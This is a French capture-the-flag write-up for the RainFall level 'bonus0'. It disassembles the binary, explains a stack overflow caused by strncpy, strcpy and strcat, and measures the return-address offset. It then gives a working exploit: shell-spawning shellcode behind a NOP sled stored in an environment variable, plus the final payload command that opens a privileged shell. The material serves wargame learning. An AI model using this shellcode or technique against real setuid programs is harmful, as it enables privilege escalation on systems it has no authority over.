On a un executable bonus0 qui attend, deux entrée et qui affiche [input1 input2]

bonus0@RainFall:~$ ./bonus0
 -
input1
 -
input2
input1 input2

Avec gdb et info functions, on ne voit 3 fonctions intéréssante: main pp p

Dump of assembler code for function main:
   0x080485a4 <+0>:	push   %ebp
   0x080485a5 <+1>:	mov    %esp,%ebp
   0x080485a7 <+3>:	and    $0xfffffff0,%esp
   0x080485aa <+6>:	sub    $0x40,%esp
   0x080485ad <+9>:	lea    0x16(%esp),%eax
   0x080485b1 <+13>:	mov    %eax,(%esp)
   0x080485b4 <+16>:	call   0x804851e <pp>
   0x080485b9 <+21>:	lea    0x16(%esp),%eax
   0x080485bd <+25>:	mov    %eax,(%esp)
   0x080485c0 <+28>:	call   0x80483b0 <puts@plt>
   0x080485c5 <+33>:	mov    $0x0,%eax
   0x080485ca <+38>:	leave
   0x080485cb <+39>:	ret
End of assembler dump.

Dump of assembler code for function pp:
   0x0804851e <+0>:	push   %ebp
   0x0804851f <+1>:	mov    %esp,%ebp
   0x08048521 <+3>:	push   %edi
   0x08048522 <+4>:	push   %ebx
   0x08048523 <+5>:	sub    $0x50,%esp
   0x08048526 <+8>:	movl   $0x80486a0,0x4(%esp)
   0x0804852e <+16>:	lea    -0x30(%ebp),%eax
   0x08048531 <+19>:	mov    %eax,(%esp)
   0x08048534 <+22>:	call   0x80484b4 <p>
   0x08048539 <+27>:	movl   $0x80486a0,0x4(%esp)
   0x08048541 <+35>:	lea    -0x1c(%ebp),%eax
   0x08048544 <+38>:	mov    %eax,(%esp)
   0x08048547 <+41>:	call   0x80484b4 <p>
   0x0804854c <+46>:	lea    -0x30(%ebp),%eax
   0x0804854f <+49>:	mov    %eax,0x4(%esp)
   0x08048553 <+53>:	mov    0x8(%ebp),%eax
   0x08048556 <+56>:	mov    %eax,(%esp)
   0x08048559 <+59>:	call   0x80483a0 <strcpy@plt>
   0x0804855e <+64>:	mov    $0x80486a4,%ebx
   0x08048563 <+69>:	mov    0x8(%ebp),%eax
   0x08048566 <+72>:	movl   $0xffffffff,-0x3c(%ebp)
   0x0804856d <+79>:	mov    %eax,%edx
   0x0804856f <+81>:	mov    $0x0,%eax
   0x08048574 <+86>:	mov    -0x3c(%ebp),%ecx
   0x08048577 <+89>:	mov    %edx,%edi
   0x08048579 <+91>:	repnz scas %es:(%edi),%al
   0x0804857b <+93>:	mov    %ecx,%eax
   0x0804857d <+95>:	not    %eax
   0x0804857f <+97>:	sub    $0x1,%eax
   0x08048582 <+100>:	add    0x8(%ebp),%eax
   0x08048585 <+103>:	movzwl (%ebx),%edx
   0x08048588 <+106>:	mov    %dx,(%eax)
   0x0804858b <+109>:	lea    -0x1c(%ebp),%eax
   0x0804858e <+112>:	mov    %eax,0x4(%esp)
   0x08048592 <+116>:	mov    0x8(%ebp),%eax
   0x08048595 <+119>:	mov    %eax,(%esp)
   0x08048598 <+122>:	call   0x8048390 <strcat@plt>
   0x0804859d <+127>:	add    $0x50,%esp
   0x080485a0 <+130>:	pop    %ebx
   0x080485a1 <+131>:	pop    %edi
   0x080485a2 <+132>:	pop    %ebp
   0x080485a3 <+133>:	ret
End of assembler dump.

Dump of assembler code for function p:
   0x080484b4 <+0>:	push   %ebp
   0x080484b5 <+1>:	mov    %esp,%ebp
   0x080484b7 <+3>:	sub    $0x1018,%esp
   0x080484bd <+9>:	mov    0xc(%ebp),%eax
   0x080484c0 <+12>:	mov    %eax,(%esp)
   0x080484c3 <+15>:	call   0x80483b0 <puts@plt>
   0x080484c8 <+20>:	movl   $0x1000,0x8(%esp)
   0x080484d0 <+28>:	lea    -0x1008(%ebp),%eax
   0x080484d6 <+34>:	mov    %eax,0x4(%esp)
   0x080484da <+38>:	movl   $0x0,(%esp)
   0x080484e1 <+45>:	call   0x8048380 <read@plt>
   0x080484e6 <+50>:	movl   $0xa,0x4(%esp)
   0x080484ee <+58>:	lea    -0x1008(%ebp),%eax
   0x080484f4 <+64>:	mov    %eax,(%esp)
   0x080484f7 <+67>:	call   0x80483d0 <strchr@plt>
   0x080484fc <+72>:	movb   $0x0,(%eax)
   0x080484ff <+75>:	lea    -0x1008(%ebp),%eax
   0x08048505 <+81>:	movl   $0x14,0x8(%esp)
   0x0804850d <+89>:	mov    %eax,0x4(%esp)
   0x08048511 <+93>:	mov    0x8(%ebp),%eax
   0x08048514 <+96>:	mov    %eax,(%esp)
   0x08048517 <+99>:	call   0x80483f0 <strncpy@plt>
   0x0804851c <+104>:	leave
   0x0804851d <+105>:	ret
End of assembler dump.

Dans p, strncpy(dst, buf, 20) n'écrit pas le \0 final lorsqu'il copie les 20 octets pleins.

Dans pp, b1 et b2 sont adjacents sur la pile, exactement à 20 octets d'écart (ebp-0x30 et ebp-0x1c).

Du coup, strcpy(dst, b1) copie depuis b1 et enchaîne directement sur b2 (aucun null entre les deux) ; avec le strcat qui suit, on déverse dans dst bien plus de données que la taille du buffer de main, ce qui écrase l'adresse de retour de main.

# Trouver le décalage de l'adresse de retour (R)

Poser un breakpoint sur call pp (à ce moment, le sommet de pile contient &buf), puis lire &buf et &savedEIP :

gdb
(gdb) b *0x080485b4
(gdb) r
(gdb) x/wx $esp        # &buf, ex : 0xbffff5f6
(gdb) p/x $ebp+4       # &savedEIP, ex : 0xbffff62c
R = savedEIP - buf = 0xbffff62c - 0xbffff5f6 = 0x36 = 54

buf → adresse de retour = 54 octets. Attention : à cause de and $0xfffffff0,%esp (alignement), R varie légèrement selon l'environnement — il faut le mesurer.

# Localiser la position de l'écrasement

Le résultat de la concaténation ressemble à : [entrée1] [entrée2] " " [entrée2]. On envoie deux chaînes distinctes comme marqueurs et on regarde où atterrit EIP :

entrée1 = aaaabbbbccccddddeeee   (20)
entrée2 = ffffgggghhhhiiiijjjj   (20)

Au crash, EIP = 0x69686868 = "hhhi" → ça tombe vers le 9e octet de entrée2.

En pratique, la disposition qui fonctionne : entrée2 = 20 octets, sans null final, adresse placée au 9e octet. Comme b2 n'est pas terminé par un null, la concaténation se décale globalement, ce qui fait tomber cette position pile sur l'adresse de retour (décalage 54).

# Placer le shellcode (variable d'environnement)

Chaque entrée ne fait que 20 octets, trop court pour le shellcode : on le met dans une variable d'environnement, précédée d'un gros NOP sled :

```bash
export SC=$(python2 -c 'print "\x90"*200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"')
```

Trouver son adresse (celle donnée par gdb n'est qu'indicative, elle bougera à l'exécution réelle) :

gdb
(gdb) b main
(gdb) r
(gdb) p (char *)getenv("SC")     # ex : 0xbffffe32 (début du NOP sled)

Viser le milieu du sled est plus sûr, par exemple 0xbffffe32 + 0x64 = 0xbffffe96.


# Exploit final (à lancer hors gdb)

gdb supprime le SUID, donc l'élévation de privilèges doit se faire hors gdb, en lançant directement le binaire :

bash
(python2 -c 'print("A"*20)';
 python2 -c 'import struct; print("B"*9 + struct.pack("<I", 0xbffffe96) + "B"*7)';
 cat) | ./bonus0
A*20 → remplit b1, ce qui fait déborder strcpy au-delà ;
B*9 + adresse + B*7 → 20 octets, l'adresse tombe au 9e octet = adresse de retour (décalage 54) ;
0xbffffe96 → atterrit dans le NOP sled, glisse jusqu'au shellcode ;
cat → garde stdin ouvert, le shell reste interactif.